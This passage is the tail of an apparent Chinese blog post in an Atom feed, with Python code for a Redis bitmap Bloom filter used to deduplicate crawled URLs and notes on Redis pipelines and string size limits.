class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">insert</span><span class="params">(self, content)</span>:</span></span><br><span class="line">    locs = self.cal_offsets(content)</span><br><span class="line">    <span class="keyword">for</span> loc <span class="keyword">in</span> locs:</span><br><span class="line">        self.db.setbit(self.key, loc, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_contains</span><span class="params">(self, content)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> content:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    locs = self.cal_offsets(content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> all(<span class="keyword">True</span> <span class="keyword">if</span> self.db.getbit(self.key, loc) <span class="keyword">else</span> <span class="keyword">False</span> <span class="keyword">for</span> loc <span class="keyword">in</span> locs)</span><br></pre></td></tr></table></figure><p>在 is_contains 方法中，我们用了 any 这个函数，是因为只要 k 个点有一个不为 1 元素就不存在。当然，就算是都为 1，也会由于小概率的哈希冲突存在一定的误差，这个在前面说明过。</p><p>代码见 github : <a href="https://github.com/facert/BloomFilterForRedis" target="_blank" rel="noopener">https://github.com/facert/BloomFilterForRedis</a></p><p>这里面其实还有很多细节，比如 redis setbit 的时候可以采用 pipeline 来批量操作，另外对于 redis string 来说，最大是 512M，如果超过这个大小会阻塞 redis 服务器做一个再次分配内存的操作，需要尽量避免，可以采用分配多个 string 的方式。</p><p>最后，redis bitmaps 操作可以用于统计数据的实时计算，非常节省空间。感兴趣的可以看下这篇文章: <a href="http://blog.getspool.com/2011/11/29/fast-easy-realtime-metrics-using-redis-bitmaps/" target="_blank" rel="noopener">http://blog.getspool.com/2011/11/29/fast-easy-realtime-metrics-using-redis-bitmaps/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;其实这篇文章跟过滤中介贴没什么关系，只是在爬豆瓣小组的时候遇到的一点思考，我们知道，其实爬虫就是循环的爬取网站的 url，但是怎么判断爬取的 url 是否重复呢，最简单的，维护一个列表，每次循环查找，很明显效率很低。进阶的，采用哈希表，每次查询都是 O(1), 看上去不错。不过如果一旦 url 大到一定程度时，单台机器的内存肯定吃不消，这个时候分布式方案就呼之欲出，变得越来越复杂。那么能不能在牺牲一点点精确性的前提下，有简单的方案呢，答案是肯定的。这就是 布隆过滤器。&lt;br&gt;
    
    </summary>
    
    
      <category term="algorithm" scheme="http://yousite.com/tags/algorithm/"/>
    
  </entry>
  
</feed>
